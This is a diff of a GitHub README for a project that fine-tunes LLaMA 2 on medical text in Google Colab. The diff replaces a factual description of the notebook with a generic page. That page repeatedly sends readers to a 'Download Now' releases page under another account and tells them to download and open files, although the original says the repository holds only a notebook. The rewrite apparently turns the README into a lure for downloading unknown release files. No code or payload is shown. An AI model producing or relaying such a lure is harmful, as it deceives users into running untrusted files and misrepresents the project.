@@ -1,90 +1,80 @@
-# Fine-Tuning a LLaMA 2 Model on Medical Text Data Using Hugging Face
+# 🚀 Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face - Fine-tune your model easily
 
-This notebook demonstrates how to **fine-tune a pre-trained LLaMA 2 model** using **Hugging Face Transformers** and **Google Colab**.  
-The model used is [`aboonaji/llama2finetune-v2`](https://huggingface.co/aboonaji/llama2finetune-v2), and the fine-tuning dataset is a **medical text dataset** also hosted on Hugging Face.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/releases)
 
----
+## 📚 Overview
 
-##  Overview
+This project helps you fine-tune a pretrained LLaMA 2 model using Hugging Face Transformers. We use the latest techniques in a user-friendly environment, Google Colab. The model we start with, **aboonaji/llama2finetune-v2**, comes from Hugging Face Hub, and we adapt it to work with a medical text dataset, **wiki_medical_terms_llam2_format**. This means you can customize a powerful AI model to better understand medical language.
 
-| Step | Description |
-|------|--------------|
-| **1. Installing and Importing Libraries** | Installed and imported all required packages like `torch`, `transformers`, `trl`, `peft`, `datasets`, and `bitsandbytes` directly in Colab. |
-| **2. Loading the Base Model** | Loaded the pre-trained LLaMA 2 model (`aboonaji/llama2finetune-v2`) from Hugging Face using quantization (4-bit) to optimize GPU memory. |
-| **3. Tokenizer Setup** | Loaded the tokenizer from the same Hugging Face model, set the padding side to *right*, and used the end-of-sequence token as the padding token. |
-| **4. Setting Training Arguments** | Defined `TrainingArguments` such as batch size, gradient accumulation, and max steps to control the fine-tuning process. |
-| **5. Supervised Fine-Tuning (SFT)** | Created an **SFT Trainer** (supervised fine-tuning trainer) using the medical dataset. The model learns medical domain terminology and relationships from this dataset. |
-| **6. Training Execution** | Ran the training process in Colab GPU environment, ensuring GPU memory optimization by adjusting batch size and using mixed-precision (`fp16`) training. |
-| **7. Chatting with the Fine-Tuned Model** | Interacted with the fine-tuned model using a text-generation pipeline. Sample prompts like “Explain Paracetamol” or “Tell me about Botulism” were given to observe the model’s medical knowledge. |
+## 🖥 System Requirements
 
----
+To run this project, you need:
 
-##  Model Details
+- A stable internet connection
+- A Google account (to access Google Colab)
+- No local software installation is needed; everything runs in the cloud
 
-- **Base model:** `aboonaji/llama2finetune-v2`  
-- **Architecture:** LLaMA 2 (Causal LM)  
-- **Framework:** Hugging Face Transformers + TRL (SFT Trainer)  
-- **Quantization:** 4-bit (BitsAndBytes)  
-- **Dataset:** `aboonaji/wiki_medical_terms_llam2_format` (medical text)  
-- **Environment:** Google Colab GPU  
-- **Libraries used:** `torch`, `transformers`, `trl`, `datasets`, `peft`, `bitsandbytes`
+## 🚀 Getting Started
 
----
+1. **Visit the Releases Page**: To begin, go to our downloads page. Click the link below:
+   [Download Software](https://github.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/releases)
 
-##  Methodology
+2. **Select the Appropriate File**: On the releases page, you will find different versions of the project tools. Choose the latest version for the best experience.
 
-1. **Model Preparation** – Load pre-trained model and tokenizer from Hugging Face.  
-2. **Fine-Tuning Setup** – Configure LoRA (PEFT) and training parameters.  
-3. **Dataset Loading** – Fetch medical dataset directly from Hugging Face.  
-4. **Training** – Fine-tune model on the dataset using SFT Trainer.  
-5. **Evaluation / Chat** – Interact with the fine-tuned model using sample prompts.
+3. **Follow the Instructions**: Click on the downloaded files to open them. We provide clear instructions on how to use the model in Google Colab.
 
----
-## Optional
+## 📥 Download & Install
 
-If you want install **Requiremets.txt** and to reproduce the same environment locally or in another Colab, Just run the belwo command in a Terminal or Cell:
-```
-pip install -r requirements.txt
-```
----
+To download the fine-tuning tools:
 
-## Example Interaction
+- **Visit this page to download**: [GitHub Releases](https://github.com/collo59/Fine-Tuning-a-LLaMA-2-Model-on-Medical-Text-Data-Using-Hugging-Face/releases)
 
-User: Explain Paracetamol.
-Model: Paracetamol (acetaminophen) is a common pain reliever and fever reducer. It works by inhibiting prostaglandin synthesis in the brain, which helps reduce pain and temperature.
+Follow these steps to install:
 
----
+1. Click on the version you want.
+2. Download the relevant files.
+3. Open Google Colab in your web browser.
+4. Upload the downloaded files to your Google Colab workspace.
 
-##  Tools Used
+## 🧑‍💻 How to Use
 
-- **Google Colab** — for training and execution  
-- **Hugging Face Hub** — for model and dataset hosting  
-- **PyTorch** — backend framework for model computation  
-- **Transformers & TRL** — training and text generation utilities  
-- **BitsAndBytes** — for quantized model loading (4-bit)  
-- **PEFT (LoRA)** — for parameter-efficient fine-tuning
+1. **Open Google Colab**: Go to [Google Colab](https://colab.research.google.com/).
 
----
+2. **Create a New Notebook**: Click on "New Notebook" or open an existing one.
 
-##  Output
+3. **Upload Your Files**: Use the file upload feature in Colab to include your downloaded files. This will make them available for use.
 
-- Fine-tuned LLaMA 2 model with enhanced understanding of **medical terminology and context**.  
-- Model responds to health-related prompts more accurately than the base version.  
-- Results verified through manual chat testing in Colab.
+4. **Copy Example Code**: We provide example code in the documentation. Copy and paste it into your Colab notebook.
 
----
+5. **Run the Code**: Click the "Run" button to execute the cells. This will start the fine-tuning process on your selected dataset.
 
-##  Notes
+6. **Monitor Progress**: You will see output in the notebook as the model trains. Keep an eye on performance metrics to see how well the model is learning.
 
-- Training was done entirely in **Google Colab**, not in VS Code or a local setup.  
-- **No API keys or tokens** are included in this repository.  
-- Model and dataset are **publicly available** on Hugging Face Hub.  
-- This repository only contains the **notebook (.ipynb)** and documentation for reproducibility.
+## 🔍 Features
 
----
+- **User-Friendly Setup**: Everything runs in Google Colab, so you don’t need to worry about complex installations.
+- **Cutting-Edge Technology**: Utilizes Hugging Face Transformers and LoRA techniques to improve the model's efficiency.
+- **Customizable**: Tailor the model to suit your specific medical text data needs.
+- **Pretrained Model**: Start with a solid foundation using a fine-tuned LLaMA 2 model.
 
-## My Website
+## 🛠 Troubleshooting
 
-- https://bharathyalagi.netlify.app/
+If you encounter problems while downloading or running the project, consider the following:
 
-# Thank You 
+- **Check Internet Connection**: Make sure you're online.
+- **Clear Cache**: If a page doesn’t load, try clearing your browser's cache.
+- **Refer to the Documentation**: You can find helpful tips in the documentation section of the GitHub repository.
+
+## 📱 Contact
+
+For further assistance, or if you have questions, please open an issue on the GitHub repository. We are here to help you through the process.
+
+## 📝 License
+
+This project is licensed under the MIT License. You can use it freely, but please respect the terms laid out in the license.
+
+## 💡 Contributors
+
+We welcome contributions. If you want to help improve this project or suggest changes, check out our contribution guidelines on the GitHub page. 
+
+Enjoy using the fine-tuned LLaMA 2 model to enhance your medical text understanding!
